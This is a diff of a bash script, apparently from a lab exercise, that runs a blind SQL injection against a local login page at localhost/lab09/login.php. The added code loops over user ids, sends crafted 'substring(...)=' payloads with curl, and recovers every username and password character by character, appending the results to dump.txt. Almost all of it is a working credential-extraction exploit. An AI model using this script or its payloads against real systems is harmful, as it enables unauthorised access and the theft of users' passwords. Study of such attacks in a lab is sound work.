@@ -2,6 +2,7 @@
 
 for id in {0..100};
 do
+	dump=""
 	username_len=0
 	for (( ; ;))
 	do
@@ -39,38 +40,63 @@ do
 			break	
 		fi
 	done
-
-	echo "id=$id; username_len=$username_len; password_len=$password_len"
-done
-
-
-
-
-# for c in {33..126};
-# do
-# 	x=$(printf '%x' $c)
-# 	echo "%$x"
-# 	char=$(echo $x | xxd -r -p)
-# 	echo "$char"
-# done
-
-
-# i=98
-# while true; do
-# 	addr="u=\" or id=$i and substring(username,1,1)=\"a\" -- "
+	dump="$dump\nid=$id; username_len=$username_len; password_len=$password_len"
 	
-# 	addr="u=\" or id=$i and length(username)>4 -- "
-# 	curl -s --data "$addr" http://localhost/lab09/login.php > result.html
+	username=""
+	for ((pos = 1; pos<=username_len; pos++));
+	do
+		for((c=126; c>=48; c--));
+		do
+			x=$(printf '%x' $c)
+			x=$(printf "\\x$x")
+			
+			if [ $c -eq 92 ];
+			then
+				x="\\$x"
+			fi
 
-# 	file=$(<result.html)
-# 	substring="cat.JPG"
+			addr="u=\" or id=$id and substring(username,$pos,1)=\"$x\" -- "
+			curl -s --data "$addr" http://localhost/lab09/login.php > result.html
+			
+			file=$(<result.html)
+			substring="cat.JPG"
 
-# 	if [[ $file =~ $substring ]];
-# 	then
-# 		echo "admin"
-# 		echo "$i"
-# 		break	
-# 	fi
-# 	echo "it's not id $i"
-# 	((i++))
-# done
+			if [[ $file =~ $substring ]];
+			then
+				username="$username$x"
+				break
+			fi
+		done
+	done
+	dump="$dump\nusername: $username"
+
+	password=""
+	for ((pos = 1; pos<=password_len; pos++));
+	do
+		for((c=126; c>=48; c--));
+		do
+			x=$(printf '%x' $c)
+			x=$(printf "\\x$x")
+			
+			if [ $c -eq 92 ];
+			then
+				x="\\$x"
+			fi
+
+			addr="u=\" or id=$id and substring(password,$pos,1)=\"$x\" -- "
+			curl -s --data "$addr" http://localhost/lab09/login.php > result.html
+			
+			file=$(<result.html)
+			substring="cat.JPG"
+
+			if [[ $file =~ $substring ]];
+			then
+				password="$password$x"
+				break
+			fi
+		done
+	done
+	dump="$dump\npassword: $password"
+	printf "$dump"
+	printf "$dump" >> dump.txt
+done
